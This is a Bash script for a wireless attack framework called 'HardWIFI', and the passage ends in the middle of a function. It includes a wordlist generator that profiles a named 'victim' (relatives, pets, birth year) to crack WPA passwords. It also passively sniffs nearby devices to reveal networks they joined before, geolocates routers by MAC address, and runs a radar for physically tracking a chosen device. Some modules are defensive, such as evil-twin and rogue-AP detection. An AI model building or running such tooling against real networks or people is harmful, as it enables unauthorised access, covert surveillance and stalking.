#!/bin/bash
# HardWIFI - Advanced WiFi Auditing Framework
# Created by MR.hardlint (v18.7 Eclipse)

# --- COLORI ---
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

# --- CONTROLLI INIZIALI ---

# 1. Root privileges check
if [[ $EUID -ne 0 ]]; then
   echo -e "${RED}ERROR: This script must be run as root.${NC}"
   exit 1
fi

# 2. Dependency check
dependencies=("aircrack-ng" "xterm" "macchanger" "reaver" "wash" "hcxdumptool" "hcxpcapngtool" "hashcat" "bettercap" "crunch" "curl")
for dep in "${dependencies[@]}"; do
    if ! command -v "$dep" &> /dev/null; then
        echo -e "${RED}ERROR: Dependency '$dep' is not installed.${NC}"
        echo -e "${YELLOW}You can install it with: sudo apt install $dep -y${NC}"
        echo -e "${YELLOW}(Note: hcxdumptool and hcxpcapngtool are part of 'hcxtools')${NC}"
        exit 1
    fi
done

# 3. Wordlist check
WORDLIST="/usr/share/wordlists/rockyou.txt"
WORDLIST_GZ="/usr/share/wordlists/rockyou.txt.gz"

if [[ ! -f "$WORDLIST" ]]; then
    if [[ -f "$WORDLIST_GZ" ]]; then
        echo -e "${BLUE}[*] Compressed wordlist found. Extracting...${NC}"
        gunzip -c "$WORDLIST_GZ" > "$WORDLIST"
    else
        echo -e "${RED}ERROR: Wordlist not found.${NC}"
        exit 1
    fi
fi

# --- DISCLAIMER ---
clear
echo -e "${YELLOW}********************************************************************************${NC}"
echo -e "${RED}DISCLAIMER! Do not use this tool for illegal activities!${NC}"
echo -e "${RED}The creator takes no responsibility for any misuse of this script.${NC}"
echo -e "${YELLOW}********************************************************************************${NC}"
echo ""
read -p "Press ENTER to accept and continue..."

# --- CLEANUP FUNCTION ---
cleanup() {
    echo -e "\n${BLUE}[*] Shutting down and cleaning up system...${NC}"
    
    # 1. Stop capture processes if active
    [[ -n "$AIRODUMP_PID" ]] && kill $AIRODUMP_PID 2>/dev/null
    [[ -n "$DEAUTH_PID" ]] && kill $DEAUTH_PID 2>/dev/null
    [[ -n "$HCXDUMP_PID" ]] && kill $HCXDUMP_PID 2>/dev/null
    [[ -n "$REAVER_PID" ]] && kill $REAVER_PID 2>/dev/null
    [[ -n "$HASHCAT_PID" ]] && kill $HASHCAT_PID 2>/dev/null
    [[ -n "$BETTERCAP_PID" ]] && kill $BETTERCAP_PID 2>/dev/null
    
    # 2. Stop mass attack processes (mdk4)
    [[ -n "$MDK_D_PID" ]] && kill $MDK_D_PID 2>/dev/null
    [[ -n "$MDK_A_PID" ]] && kill $MDK_A_PID 2>/dev/null
    [[ -n "$RAG_D_PID" ]] && kill $RAG_D_PID 2>/dev/null
    [[ -n "$RAG_A_PID" ]] && kill $RAG_A_PID 2>/dev/null
    [[ -n "$RAG_B_PID" ]] && kill $RAG_B_PID 2>/dev/null
    [[ -n "$SIEGE_A_PID" ]] && kill $SIEGE_A_PID 2>/dev/null
    [[ -n "$SIEGE_M_PID" ]] && kill $SIEGE_M_PID 2>/dev/null
    pkill mdk4 2>/dev/null
    
    # 3. Restore Monitor -> Managed interface
    if [[ -n "$MON_IFACE" ]]; then
        echo -e "${BLUE}[*] Restoring interface $MON_IFACE...${NC}"
        airmon-ng stop "$MON_IFACE" > /dev/null 2>&1
    fi

    # 4. Restore original MAC Address if Ghost Mode was active
    if [[ "$GHOST_MODE" == true && -n "$WIFI_IFACE" ]]; then
        echo -e "${BLUE}[*] Restoring original MAC Address on $WIFI_IFACE...${NC}"
        ip link set "$WIFI_IFACE" down > /dev/null 2>&1
        macchanger -p "$WIFI_IFACE" > /dev/null 2>&1
        ip link set "$WIFI_IFACE" up > /dev/null 2>&1
    fi

    # 5. Clean up temporary files
    rm -rf /tmp/hardwifi_* 2>/dev/null
    
    echo -e "${GREEN}[V] Cleanup complete. See you next time!${NC}"
    pkill -f "python3 -m http.server 80" > /dev/null 2>&1
    exit
}

# --- MONITOR MODE LOGIC ---
ensure_monitor_mode() {
    # 1. If MON_IFACE is already set and exists, use it
    if [[ -n "$MON_IFACE" ]] && ip link show "$MON_IFACE" &>/dev/null; then
        return 0
    fi

    # 2. Search for an already active monitor interface
    MON_IFACE=$(iw dev | grep Interface | awk '{print $2}' | grep mon | head -n 1)
    if [[ -n "$MON_IFACE" ]]; then
        return 0
    fi

    # 3. If not found, activate Monitor Mode on selected WIFI_IFACE
    if [[ -n "$WIFI_IFACE" ]]; then
        echo -e "${BLUE}[*] Activating Monitor Mode on $WIFI_IFACE...${NC}"
        airmon-ng start "$WIFI_IFACE" > /dev/null
        sleep 2
        # Search again after start
        MON_IFACE=$(iw dev | grep Interface | awk '{print $2}' | grep mon | head -n 1)
        # Fallback if name didn't change (some kernels)
        if [[ -z "$MON_IFACE" ]]; then
            if ip link show "${WIFI_IFACE}mon" &>/dev/null; then
                MON_IFACE="${WIFI_IFACE}mon"
            else
                MON_IFACE="$WIFI_IFACE"
            fi
        fi
        echo -e "${GREEN}[V] Monitor Interface detected: $MON_IFACE${NC}"
        return 0
    else
        echo -e "${RED}[!] ERROR: No Wi-Fi interface selected.${NC}"
        return 1
    fi
}


# Imposta il trap per catturare l'uscita (Ctrl+C, crash, fine script)
trap cleanup EXIT SIGINT SIGTERM

# --- SMART GENERATOR FUNCTION ---
generate_smart_wordlist() {
    echo -e "\n${YELLOW}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
    echo -e "       ${GREEN}SMART PASSWORD GENERATOR v1.0 (PROFILING)${NC}"
    echo -e "${YELLOW}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
    echo -e "${BLUE}[*] Enter info (leave blank to skip)${NC}"
    
    read -p "Victim Name: " v_nome
    read -p "Victim Lastname: " v_cognome
    read -p "Year of Birth (e.g. 1995): " v_anno
    read -p "Relatives names (space separated): " v_parenti
    read -p "Pet name: " v_animale

    WORDLIST="/tmp/hardwifi_smart.txt"
    echo -n "" > "$WORDLIST"

    # Convert to array
    items=("$v_nome" "$v_cognome" "$v_anno" "$v_animale" $v_parenti)
    
    echo -e "${BLUE}[*] Generating combinations...${NC}"

    for i in "${items[@]}"; do
        if [[ -n "$i" ]]; then
            echo "$i" >> "$WORDLIST"
            echo "${i}123" >> "$WORDLIST"
            echo "${i}!" >> "$WORDLIST"
            echo "${i}?" >> "$WORDLIST"
            echo "${i}*" >> "$WORDLIST"
            # Cross combinations
            for j in "${items[@]}"; do
                if [[ -n "$j" && "$i" != "$j" ]]; then
                    echo "${i}${j}" >> "$WORDLIST"
                    echo "${i}${j}!" >> "$WORDLIST"
                    echo "${i}${j}123" >> "$WORDLIST"
                fi
            done
        fi
    done

    # Deduplicate and clean (min 8 chars for WPA)
    sort -u "$WORDLIST" | awk 'length($0) >= 8' > "${WORDLIST}.tmp" && mv "${WORDLIST}.tmp" "$WORDLIST"
    
    echo -e "${GREEN}[V] Generation complete! (${WORDLIST})${NC}"
    echo -e "${YELLOW}[!] Passwords generated: $(wc -l < "$WORDLIST")${NC}"
}

# --- CAPTURED DEVICES REPORT FUNCTION ---
show_captured_clients() {
    local bssid=$1
    local ssid=$2
    # Search for the latest CSV file generated by airodump
    local csv_file=$(ls /tmp/hardwifi_capture/"$ssid"*.csv 2>/dev/null | tail -n 1)

    if [[ -f "$csv_file" ]]; then
        echo -e "\n${YELLOW}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
        echo -e "       ${GREEN}DETECTED DEVICES REPORT DURING CAPTURE${NC}"
        echo -e "${YELLOW}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
        echo -e "${BLUE}Traffic analysis for network: $ssid ($bssid)${NC}"
        echo ""
        echo -e "${CYAN}MAC Address         | Signal (PWR) | Packets${NC}"
        echo -e "--------------------------------------------------------------"
        
        # CSV Parsing: find rows containing our BSSID
        grep -i "$bssid" "$csv_file" | grep -v "BSSID" | awk -F',' '{ if(length($1) == 17 && $1 != "'$bssid'") print $1 " | " $4 "          | " $5 }' | sort -u
        
        echo -e "--------------------------------------------------------------"
    else
        echo -e "${RED}[!] No CSV log found to analyze devices.${NC}"
    fi
}

# --- IP GUESSER (NETWORK DISCOVERY) ---
run_ip_guesser() {
    clear
    echo -e "${RED}████████████████████████████████████████████████████████████████████████████████${NC}"
    echo -e "${RED}               IP GUESSER v10.7 – Network Discovery Lab                         ${NC}"
    echo -e "${RED}████████████████████████████████████████████████████████████████████████████████${NC}"
    echo ""

    # 1. Main Gateway Detection
    IP_GW=$(ip route show | grep default | awk '{print $3}' | head -n1)
    NETWORK=$(ip -o -f inet addr show | grep -v '127.0.0.1' | head -n 1 | awk '{print $4}' | head -n1)
    
    if [[ -z "$NETWORK" ]]; then
        echo -e "${RED}ERROR: No network detected.${NC}"
        return
    fi

    echo -e "${BLUE}[*] Default Gateway: ${GREEN}$IP_GW${NC}"
    echo -e "${BLUE}[*] Network Range: ${YELLOW}$NETWORK${NC}"
    echo -e "${BLUE}[*] Scanning for devices... (Wait 10-15 seconds)${NC}"
    echo ""

    # 2. Fast ARP/Ping Scan
    printf "${YELLOW}%-15s | %-17s | %-25s${NC}\n" "IP ADDRESS" "MAC ADDRESS" "VENDOR / DEVICE NAME"
    echo -e "${BLUE}--------------------------------------------------------------------------------${NC}"

    # Run nmap -sn to discover hosts and vendors
    nmap -sn "$NETWORK" | grep -v "Starting Nmap" | grep -v "Nmap done" | while read -r line; do
        if echo "$line" | grep -q "Nmap scan report for"; then
            CURRENT_IP=$(echo "$line" | awk '{print $NF}' | tr -d '()')
        elif echo "$line" | grep -q "MAC Address:"; then
            MAC=$(echo "$line" | awk '{print $3}')
            VENDOR=$(echo "$line" | cut -d'(' -f2 | tr -d ')')
            
            # Highlight Gateway
            if [[ "$CURRENT_IP" == "$IP_GW" ]]; then
                printf "${GREEN}%-15s${NC} | %-17s | ${RED}%-25s (MAIN)${NC}\n" "$CURRENT_IP" "$MAC" "$VENDOR"
            else
                printf "%-15s | %-17s | %-25s\n" "$CURRENT_IP" "$MAC" "$VENDOR"
            fi
        fi
    done

    echo -e "${BLUE}--------------------------------------------------------------------------------${NC}"
    echo -e "${YELLOW}[!] Tip: If your new router is connected, look for it by Vendor (e.g. TP-Link).${NC}"
    echo ""
    read -p "Press [ENTER] to continue..."
}

# --- DIGITAL PROFILER (PROBE SNIFFER) ---
run_probe_sniffer() {
    clear
    echo -e "${RED}████████████████████████████████████████████████████████████████████████████████${NC}"
    echo -e "${RED}               DIGITAL PROFILER v11.0 – The Eye of Sauron 👁️                    ${NC}"
    echo -e "${RED}████████████████████████████████████████████████████████████████████████████████${NC}"
    echo ""
    echo -e "${YELLOW}This module 'listens' for help requests sent by nearby devices.${NC}"
    echo -e "${YELLOW}Reveals networks they've connected to in the past (Hotel, Airports, Home).${NC}"
    echo -e "${YELLOW}WARNING: No packets are transmitted. 100% Stealth & Passive.${NC}"
    echo ""
    
    if [[ -z "$MON_IFACE" ]]; then
        echo -e "${RED}[!] Monitor Mode non attiva. Abilitazione in corso...${NC}"
        if [[ -n "$WIFI_IFACE" ]]; then
            airmon-ng start "$WIFI_IFACE" > /dev/null
            MON_IFACE="${WIFI_IFACE}mon"
            if ! ip link show "$MON_IFACE" &> /dev/null; then MON_IFACE=$WIFI_IFACE; fi
        else
            echo -e "${RED}ERRORE: Interfaccia Wi-Fi non definita.${NC}"
            read -p "Premi INVIO per tornare..."
            return
        fi
    fi

    # Pulizia e avvio airodump
    PROBE_FILE="/tmp/hardwifi_probes"
    rm -f ${PROBE_FILE}*
    
    echo -e "${BLUE}[*] Avvio Radar Probe Requests su $MON_IFACE...${NC}"
    airodump-ng --write "$PROBE_FILE" --output-format csv "$MON_IFACE" &> /dev/null &
    AIRODUMP_PID=$!

    echo -e "${BLUE}[*] Radar attivo. Inizio profilazione... (CTRL+C per uscire)${NC}"
    sleep 3

    while true; do
        clear
        echo -e "${RED}███ DIGITAL PROFILER IN ESECUZIONE 👁️ ███${NC} (Aggiornamento: $(date +%H:%M:%S))"
        echo -e "${BLUE}════════════════════════════════════════════════════════════════════════════════════════════════════════${NC}"
        printf "${YELLOW}%-20s | %-50s${NC}\n" "MAC ADDRESS TARGET" "RETI CERCATE NEL PASSATO (PROBES)"
        echo -e "${BLUE}════════════════════════════════════════════════════════════════════════════════════════════════════════${NC}"
        
        CSV_DATA="${PROBE_FILE}-01.csv"
        if [[ -f "$CSV_DATA" ]]; then
            # Parsing CSV di airodump per le station info
            awk -F',' '/Station MAC/{flag=1; next} /^$/{flag=0} flag {
                mac=$1; probes=$7;
                gsub(/^[ \t]+|[ \t]+$/, "", mac);
                gsub(/^[ \t]+|[ \t]+$/, "", probes);
                if(length(mac)==17 && length(probes)>0 && probes != " " && probes !~ /^ *$/) {
                    printf "\033[32m%-20s\033[0m | \033[36m%s\033[0m\n", mac, probes
                }
            }' "$CSV_DATA" | sort -u
        else
            echo -e "${YELLOW}In attesa di dati...${NC}"
        fi
        
        echo -e "${BLUE}════════════════════════════════════════════════════════════════════════════════════════════════════════${NC}"
        sleep 5
    done
}

# --- FUNZIONE HACKER HUNTER (WIDS) ---
run_wids() {
    clear
    echo -e "${RED}████████████████████████████████████████████████████████████████████████████████${NC}"
    echo -e "${RED}               HACKER HUNTER v11.0 – Wireless Intrusion Detection 🛡️           ${NC}"
    echo -e "${RED}████████████████████████████████████████████████████████████████████████████████${NC}"
    echo ""
    echo -e "${YELLOW}Questo modulo scansiona costantemente l'etere per rilevare attacchi in corso.${NC}"
    echo -e "${YELLOW}Cerca Evil Twins (Cloni di SSID) e volumi anomali di pacchetti (DoS).${NC}"
    echo ""
    
    if [[ -z "$MON_IFACE" ]]; then
        echo -e "${RED}[!] Monitor Mode non attiva. Abilitazione in corso...${NC}"
        if [[ -n "$WIFI_IFACE" ]]; then
            airmon-ng start "$WIFI_IFACE" > /dev/null
            MON_IFACE="${WIFI_IFACE}mon"
            if ! ip link show "$MON_IFACE" &> /dev/null; then MON_IFACE=$WIFI_IFACE; fi
        else
            echo -e "${RED}ERRORE: Interfaccia Wi-Fi non definita.${NC}"
            read -p "Premi INVIO per tornare..."
            return
        fi
    fi

    WIDS_FILE="/tmp/hardwifi_wids"
    rm -f ${WIDS_FILE}*
    
    echo -e "${BLUE}[*] Inizializzazione Rilevamento Anomalie su $MON_IFACE...${NC}"
    # Hopping su tutte la bande
    airodump-ng --band abg --write "$WIDS_FILE" --output-format csv "$MON_IFACE" &> /dev/null &
    AIRODUMP_PID=$!
    
    sleep 3

    while true; do
        clear
        echo -e "${RED}███ WIDS RADAR ATTIVO 🛡️ ███${NC} (Scansione in corso... CTRL+C per uscire)"
        echo -e "${BLUE}════════════════════════════════════════════════════════════════════════════════════════════════════════${NC}"
        
        CSV_DATA="${WIDS_FILE}-01.csv"
        if [[ -f "$CSV_DATA" ]]; then
            # Evil Twin Detection: Count unique BSSIDs for each SSID
            echo -e "${YELLOW}[*] Log Allarmi di Sicurezza:${NC}"
            awk -F',' '/BSSID/{flag=1; next} /^Station/{flag=0} flag {
                bssid=$1; ssid=$14;
                gsub(/^[ \t]+|[ \t]+$/, "", ssid);
                gsub(/^[ \t]+|[ \t]+$/, "", bssid);
                if(length(bssid)==17 && length(ssid)>0 && ssid != " ") {
                    key = ssid "::" bssid
                    if (!seen[key]) {
                        ssid_count[ssid]++;
                        seen[key] = 1;
                        if (ssid_count[ssid] > 1) {
                            print "\033[41m\033[97m[!!!] EVIL TWIN DETECTED: SSID \033[0m \033[31m" ssid " \033[0m\033[41m\033[97m clonato da BSSID multipli!\033[0m"
                            print " -> Attenzione: Qualcuno potrebbe star falsificando questa rete."
                        }
                    }
                }
            }' "$CSV_DATA" | tee /tmp/hardwifi_wids_alert
            
            if [[ ! -s /tmp/hardwifi_wids_alert ]]; then
                echo -e "${GREEN}    [ Nessuna anomalia BSSID rilevata ]${NC}"
            fi
            
            # Massive Data / Deauth Spike Detection
            echo -e "\n${YELLOW}[*] Rilevamento Anomalie Traffico/Clienti:${NC}"
            awk -F',' '/Station MAC/{flag=1; next} /^$/{flag=0} flag {
                mac=$1; packets=$5;
                gsub(/^[ \t]+|[ \t]+$/, "", mac);
                if(packets > 3000) {
                    print "\033[33m[!] ANOMALIA TRAFFICO: Il client " mac " ha generato " packets " pacchetti in poco tempo. (Possibile DoS / Eccesso Dati)\033[0m"
                }
            }' "$CSV_DATA" | tee /tmp/hardwifi_dos_alert
            
            if [[ ! -s /tmp/hardwifi_dos_alert ]]; then
                echo -e "${GREEN}    [ Nessuna anomalia traffico rilevata ]${NC}"
            fi
            
        else
            echo -e "${GREEN}[V] Inizializzazione in corso. Attendere...${NC}"
        fi
        
        echo -e "${BLUE}════════════════════════════════════════════════════════════════════════════════════════════════════════${NC}"
        sleep 5
    done
}

# --- FUNZIONE GHOST CATCHER (HIDDEN NETWORK DECLOAKER) ---
run_ghost_catcher() {
    clear
    echo -e "${RED}████████████████████████████████████████████████████████████████████████████████${NC}"
    echo -e "${RED}               THE GHOST CATCHER v11.2 – Smascheratore Reti 👻                  ${NC}"
    echo -e "${RED}████████████████████████████████████████████████████████████████████████████████${NC}"
    echo ""
    echo -e "${YELLOW}Questo modulo scova le reti Wi-Fi 'Invisibili' (Hidden SSID).${NC}"
    echo -e "${YELLOW}Quando un dispositivo legittimo si connette, ne intercetta e rivela il vero nome.${NC}"
    echo ""
    
    if [[ -z "$MON_IFACE" ]]; then
        echo -e "${RED}[!] Monitor Mode non attiva. Abilitazione in corso...${NC}"
        if [[ -n "$WIFI_IFACE" ]]; then
            airmon-ng start "$WIFI_IFACE" > /dev/null
            MON_IFACE="${WIFI_IFACE}mon"
            if ! ip link show "$MON_IFACE" &> /dev/null; then MON_IFACE=$WIFI_IFACE; fi
        else
            echo -e "${RED}ERRORE: Interfaccia Wi-Fi non definita.${NC}"
            read -p "Premi INVIO per tornare..."
            return
        fi
    fi

    GHOST_CSV="/tmp/hardwifi_ghost"
    rm -f ${GHOST_CSV}* 
    
    echo -e "${BLUE}[*] Inizio intercettazione reti nascoste su $MON_IFACE...${NC}"
    airodump-ng --write "$GHOST_CSV" --output-format csv "$MON_IFACE" &> /dev/null &
    AIRODUMP_PID=$!
    
    echo -e "${YELLOW}[!] Generazione Dashboard in corso...${NC}"
    
    # Creiamo un piccolo script Python per gestire la UI e lo stato in tempo reale
    GHOST_PY="/tmp/hardwifi_ghost_ui.py"
    cat << 'EOF' > "$GHOST_PY"
import os, time, sys

csv_file = "/tmp/hardwifi_ghost-01.csv"
hidden_nets = set()
decloaked_nets = {}

def print_ui():
    os.system('clear')
    print("\033[91m███ GHOST CATCHER RADAR 👻 ███\033[0m (In ascolto passivo... CTRL+C per uscire)")
    print("\033[94m═══════════════════════════════════════════════════════════════════════════════════════════\033[0m")
    
    print("\033[93m[*] FANTASMI NELL'OMBRA (Reti senza nome in attesa di connessione):\033[0m")
    if not hidden_nets:
        print("    (Nessuna rete invisibile rilevata al momento)")
    for bssid in sorted(hidden_nets):
        print(f"    - MAC: \033[97m{bssid}\033[0m  -> [\033[90m NOME NASCOSTO \033[0m]")
    
    print("")
    print("\033[92m[*] RETI DECLOAKED (Nome svelato catturato nell'aria):\033[0m")
    if not decloaked_nets:
        print("    (Nessun fantasma è ancora stato smascherato)")
    for bssid, ssid in decloaked_nets.items():
        print(f"    - MAC: \033[97m{bssid}\033[0m  ->  \033[91m{ssid}\033[0m \033[92m(SVELATO!)\033[0m")
    
    print("\033[94m═══════════════════════════════════════════════════════════════════════════════════════════\033[0m")

try:
    while True:
        if os.path.exists(csv_file):
            with open(csv_file, 'r', encoding='utf-8', errors='ignore') as f:
                lines = f.readlines()
                for line in lines:
                    if line.startswith("Station MAC"): break
                    parts = line.split(',')
                    if len(parts) > 13 and len(parts[0].strip()) == 17:
                        bssid = parts[0].strip()
                        ssid = parts[13].strip()
                        
                        if ssid == "" or "\\x00" in ssid or len(ssid) == 0:
                            if bssid not in decloaked_nets:
                                hidden_nets.add(bssid)
                        else:
                            if len(ssid) > 0 and "\\x00" not in ssid:
                                if bssid in hidden_nets:
                                    hidden_nets.remove(bssid)
                                    decloaked_nets[bssid] = ssid
        print_ui()
        time.sleep(3)
except KeyboardInterrupt:
    sys.exit(0)
EOF

    sleep 2
    python3 "$GHOST_PY"
}

# --- FUNZIONE HONEYPOT (PINEAPPLE CATCHER) ---
run_honeypot() {
    clear
    echo -e "${RED}████████████████████████████████████████████████████████████████████████████████${NC}"
    echo -e "${RED}               THE HONEYPOT v11.3 – Pineapple Catcher 🍍🪤                ${NC}"
    echo -e "${RED}████████████████████████████████████████████████████████████████████████████████${NC}"
    echo ""
    echo -e "${YELLOW}Questo modulo lancia trappole attive nell'etere per smascherare hacker.${NC}"
    echo -e "${YELLOW}Invia finte richieste Wi-Fi. Solo i dispositivi Rogue (es. Wi-Fi Pineapple)${NC}"
    echo -e "${YELLOW}risponderanno a una rete inesistente. Se riceviamo risposta, c'è un attaccante nei paraggi.${NC}"
    echo ""

    if [[ -z "$WIFI_IFACE" ]]; then
        echo -e "${RED}ERRORE: Interfaccia Wi-Fi non impostata.${NC}"
        read -p "Premi [INVIO] per tornare..."
        return
    fi
    
    # Honeypot necessita della Modalità Managed per inviare comandi iw sani
    if [[ -n "$MON_IFACE" ]]; then
        echo -e "${BLUE}[*] Chiusura Monitor Mode (Honeypot usa protocollo Managed)...${NC}"
        airmon-ng stop "$MON_IFACE" > /dev/null 2>&1
        MON_IFACE=""
        WIFI_IFACE=$(echo "$WIFI_IFACE" | sed 's/mon$//')
    fi
    
    # Essendo un nome falso autogenerato, nessuno dovrebbe mai rispondere.
    FAKE_SSID="HardWIFI_Trap_$(date +%s)"
    echo -e "${BLUE}[*] ESCA INNESCATA! Inizio a chiedere in aria: '${YELLOW}C'è la rete ${FAKE_SSID} qui?${BLUE}'${NC}"
    echo -e "${BLUE}[*] Avvio scansione Sonar... (CTRL+C per fermare)${NC}"
    echo ""
    echo -e "${YELLOW}In attesa che un Wi-Fi Pineapple abbocchi...${NC}"

    while true; do
        # Iw scan triggera la trasmissione di un Probe Request Attivo
        trap_result=$(iw dev "$WIFI_IFACE" scan ssid "$FAKE_SSID" 2>/dev/null | grep -i "BSS ")
        
        if [[ -n "$trap_result" ]]; then
             clear
             echo -e "\033[41m\033[97m████████████████████████████████████████████████████████████████████████████████\033[0m"
             echo -e "\033[41m\033[97m                     [!!!] MINACCIA CRITICA RILEVATA [!!!]                      \033[0m"
             echo -e "\033[41m\033[97m████████████████████████████████████████████████████████████████████████████████\033[0m"
             echo -e ""
             echo -e "${RED}Un Access Point ha appena risposto alla nostra rete falsa! È UN ROGUE AP (Pineapple)!${NC}"
             echo -e "${YELLOW}Un hacker sta intercettando i telefoni fingendosi le loro reti di casa o pubbliche.${NC}"
             echo ""
             mac=$(echo "$trap_result" | awk '{print $2}' | cut -d'(' -f1 | head -n1)
             echo -e "${RED}[*] MAC ADDRESS DEL DISPOSITIVO HACKER: ${GREEN}$mac${NC}"
             echo -e "${BLUE}Raccomandazione: Spegni il Wi-Fi nei telefoni intorno e cerca il dispositivo fisico.${NC}"
             echo ""
             read -p "Premi [INVIO] per chiudere l'allarme e tornare al menu principale..."
             break
        fi
        
        echo -ne "${BLUE}Sonar Ping -> ${NC}Nessuna risposta anomala... \r"
        sleep 2
        echo -ne "${GREEN}Sonar Ping -> ${NC}Nessuna risposta anomala... \r"
        sleep 2
    done
}

# --- FUNZIONE GEO-TRACKER (OSINT) ---
run_geotracker() {
    clear
    echo -e "${RED}████████████████████████████████████████████████████████████████████████████████${NC}"
    echo -e "${RED}               GEO-TRACKER v11.4 – OSINT Wi-Fi Locator 🌍📡                     ${NC}"
    echo -e "${RED}████████████████████████████████████████████████████████████████████████████████${NC}"
    echo ""
    echo -e "${YELLOW}Inserisci il MAC Address (BSSID) di un router per individuarlo fisicamente.${NC}"
    echo -e "${YELLOW}Il database OSINT mondiale cercherà le sue coordinate GPS.${NC}"
    echo ""
    read -p "Inserisci BSSID (Es. 11:22:33:44:55:66): " target_mac
    
    if [[ ! "$target_mac" =~ ^([0-9A-Fa-f]{2}[:-]){5}([0-9A-Fa-f]{2})$ ]]; then
        echo -e "${RED}[!] Errore: Formato MAC Address non valido.${NC}"
        read -p "Premi [INVIO] per uscire..."
        return
    fi
    
    echo -e "\n${BLUE}[*] Interrogazione database globali (Mylnikov OSINT) per $target_mac...${NC}"
    # Curl API
    response=$(curl -s "https://api.mylnikov.org/geolocation/wifi?v=1.1&data=open&bssid=$target_mac")
    
    if echo "$response" | grep -q '"result":200'; then
        lat=$(echo "$response" | sed -n 's/.*"lat":\([-0-9.]*\).*/\1/p')
        lon=$(echo "$response" | sed -n 's/.*"lon":\([-0-9.]*\).*/\1/p')
        if [[ -n "$lat" && -n "$lon" ]]; then
            echo -e "${GREEN}[V] BERSAGLIO LOCALIZZATO CON SUCCESSO!${NC}"
            echo -e "${YELLOW}================================================================${NC}"
            echo -e "Latitudine : ${GREEN}$lat${NC}"
            echo -e "Longitudine: ${GREEN}$lon${NC}"
            echo -e "Google Maps: ${BLUE}https://www.google.com/maps/search/?api=1&query=$lat,$lon${NC}"
            echo -e "${YELLOW}================================================================${NC}"
            echo -e "${RED}[!] Ricorda: L'uso di questi dati per stalking viola le leggi sulla privacy.${NC}"
        else
            echo -e "${RED}[!] Errore nel parsing delle coordinate.${NC}"
        fi
    else
        echo -e "${YELLOW}[!] Bersaglio non trovato nel database mondiale. Potrebbe essere una rete isolata o non mappata.${NC}"
    fi
    echo ""
    read -p "Premi [INVIO] per tornare al menu principale..."
}

# --- FUNZIONE THE FOX HUNT (RADAR FISICO) ---
run_foxhunt() {
    clear
    echo -e "${RED}████████████████████████████████████████████████████████████████████████████████${NC}"
    echo -e "${RED}               THE FOX HUNT v11.7 – Localizzatore Fisico Radar 🦊📡             ${NC}"
    echo -e "${RED}████████████████████████████████████████████████████████████████████████████████${NC}"
    echo ""
    echo -e "${YELLOW}Questo modulo trasforma la tua Antenna in un Cercametalli Digitale.${NC}"
    echo -e "${YELLOW}Ti mostrerà in DIRETTA l'avvicinamento o l'allontanamento fisico da un dispositivo.${NC}"
    echo -e "${YELLOW}Uso: Cammina col PC in mano. Più il numero (PWR) si avvicina a 0, più sei vicino al bersaglio.${NC}"
    echo ""
    
    if [[ -z "$MON_IFACE" ]]; then
        echo -e "${RED}[!] Monitor Mode non attiva. Abilitazione in corso...${NC}"
        if [[ -n "$WIFI_IFACE" ]]; then
            airmon-ng start "$WIFI_IFACE" > /dev/null
            MON_IFACE="${WIFI_IFACE}mon"
            if ! ip link show "$MON_IFACE" &> /dev/null; then MON_IFACE=$WIFI_IFACE; fi
        else
            echo -e "${RED}ERRORE: Interfaccia Wi-Fi non definita.${NC}"
            read -p "Premi INVIO per tornare..."
            return
        fi
    fi

    read -p "Inserisci il MAC Address (BSSID/Client) da pedinare: " FOX_MAC
    
    if [[ ! "$FOX_MAC" =~ ^([0-9A-Fa-f]{2}[:-]){5}([0-9A-Fa-f]{2})$ ]]; then
        echo -e "${RED}[!] Errore: Formato MAC Address non valido.${NC}"
        read -p "Premi [INVIO] per uscire..."
        return
    fi
    FOX_MAC=$(echo "$FOX_MAC" | tr '[:lower:]' '[:upper:]')
    
    FOX_CSV="/tmp/hardwifi_foxhunt"
    rm -f ${FOX_CSV}*
    
    echo -e "${BLUE}[*] Calibrazione dell'Antenna Radar su $FOX_MAC...${NC}"
    # Hopping su tutti i canali per non perdere il target se si sposta
    airodump-ng --band abg --write "$FOX_CSV" --output-format csv "$MON_IFACE" &> /dev/null &
    AIRODUMP_PID=$!
    
    sleep 3
    
    while true; do
        clear
        echo -e "${RED}███ RADAR DI PEDINAMENTO ATTIVO 🦊 ███${NC} (Muoviti nell'area... CTRL+C per uscire)"
        echo -e "${BLUE}════════════════════════════════════════════════════════════════════════════════════════════════════════${NC}"
        echo -e "BERSAGLIO AGGANCIATO: \033[97m$FOX_MAC\033[0m"
        echo ""
        
        CSV_DATA="${FOX_CSV}-01.csv"
        FOUND=0
        
        if [[ -f "$CSV_DATA" ]]; then
            # Cerca tra gli AP
            PWR_AP=$(awk -F',' -v mac="$FOX_MAC" '/BSSID/{flag=1; next} /^Station/{flag=0} flag {
                bssid=$1; pwr=$9;
                gsub(/^[ \t]+|[ \t]+$/, "", bssid);
                if(toupper(bssid) == toupper(mac)) { print pwr }
            }' "$CSV_DATA" | tail -n1)
            
            # Cerca tra i Client
            PWR_CLI=$(awk -F',' -v mac="$FOX_MAC" '/Station MAC/{flag=1; next} /^$/{flag=0} flag {
                client=$1; pwr=$4;
                gsub(/^[ \t]+|[ \t]+$/, "", client);
                if(toupper(client) == toupper(mac)) { print pwr }
            }' "$CSV_DATA" | tail -n1)
            
            PWR=${PWR_AP:-$PWR_CLI}
            
            if [[ -n "$PWR" && "$PWR" != " -1" && "$PWR" != "0" ]]; then
                FOUND=1
                # Normalizziamo su scala 0-100
                PWR_NUM=$(echo "$PWR" | tr -d ' ')
                
                if (( PWR_NUM >= -40 )); then
                    echo -e "DISTANZA FISICA STIMATA: \033[41m\033[97m 🔥 FUOCO (SEI PRATICAMENTE SOPRA L'OBIETTIVO) 🔥 \033[0m"
                    BAR="██████████████████████████"
                    COLOR="\033[91m"
                elif (( PWR_NUM >= -60 )); then
                    echo -e "DISTANZA FISICA STIMATA: \033[43m\033[30m 🟠 MOLTO VICINO (Raggio visivo) 🟠 \033[0m"
                    BAR="██████████████████"
                    COLOR="\033[93m"
